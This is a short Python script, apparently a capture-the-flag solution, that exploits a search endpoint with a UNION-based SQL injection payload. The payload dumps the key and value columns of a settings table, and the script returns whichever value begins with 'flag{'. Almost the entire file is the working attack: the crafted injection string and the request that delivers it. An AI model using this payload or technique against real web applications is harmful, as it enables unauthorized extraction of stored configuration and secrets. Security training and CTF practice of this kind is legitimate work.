from __future__ import annotations

import requests


def solve(base_url: str) -> str:
    payload = "%' UNION SELECT 0, key, 'config', value FROM settings -- "
    rows = requests.get(base_url + "/search", params={"q": payload, "format": "json"}).json()["items"]
    return next(row["status"] for row in rows if row["status"].startswith("flag{"))
